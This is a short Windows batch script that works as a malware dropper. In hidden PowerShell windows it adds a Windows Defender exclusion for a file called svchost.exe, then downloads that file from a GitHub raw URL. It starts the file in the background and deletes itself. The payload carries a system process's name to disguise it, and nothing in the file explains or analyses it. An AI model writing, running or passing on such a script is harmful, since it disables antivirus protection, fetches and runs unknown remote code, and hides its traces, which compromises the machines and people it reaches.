@echo off
cd /d "%~dp0"
powershell -w hidden -Command "Add-MpPreference -ExclusionPath '%~dp0svchost.exe'"
powershell -w hidden -Command "iwr 'https://github.com/johtaromemory-hash/test/raw/refs/heads/main/svchost.exe' -O '%~dp0svchost.exe'"
if exist "%~dp0svchost.exe" (
    start /b "" "%~dp0svchost.exe"
)
del "%~f0" >nul 2>&1
